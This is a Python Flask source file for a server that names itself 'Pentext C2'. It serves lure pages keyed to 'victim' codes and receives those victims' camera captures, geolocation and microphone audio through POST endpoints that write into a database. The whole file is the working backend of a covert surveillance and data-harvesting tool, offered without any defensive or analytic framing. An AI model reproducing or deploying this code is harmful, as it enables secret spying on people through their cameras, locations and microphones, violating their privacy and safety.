import os, json, threading, time
from flask import Flask, request, render_template, jsonify, redirect
from database import db
from config import BASE_URL

app = Flask(__name__, template_folder='templates')

@app.route('/')
def index():
    return jsonify({"status": "running", "name": "Pentext C2"})

@app.route('/camera/<code>')
def camera_page(code):
    v = db.get_victim(code)
    if v:
        return render_template('camera.html', code=code, server=BASE_URL, valid=True)
    return render_template('camera.html', code=code, server=BASE_URL, valid=False)

@app.route('/location/<code>')
def location_page(code):
    v = db.get_victim(code)
    if v:
        return render_template('location.html', code=code, server=BASE_URL, valid=True)
    return render_template('location.html', code=code, server=BASE_URL, valid=False)

@app.route('/audio/<code>')
def audio_page(code):
    v = db.get_victim(code)
    if v:
        return render_template('audio.html', code=code, server=BASE_URL, valid=True)
    return render_template('audio.html', code=code, server=BASE_URL, valid=False)

@app.route('/api/camera/<code>', methods=['POST'])
def api_camera(code):
    try:
        data = request.get_json()
        if data:
            db.update_victim_data(code, 'camera', data)
        return jsonify({"ok": True})
    except:
        return jsonify({"ok": False}), 500

@app.route('/api/location/<code>', methods=['POST'])
def api_location(code):
    try:
        data = request.get_json()
        if data:
            db.update_victim_data(code, 'location', data)
        return jsonify({"ok": True})
    except:
        return jsonify({"ok": False}), 500

@app.route('/api/audio/<code>', methods=['POST'])
def api_audio(code):
    try:
        data = request.get_json()
        if data:
            db.update_victim_data(code, 'audio', data)
        return jsonify({"ok": True})
    except:
        return jsonify({"ok": False}), 500
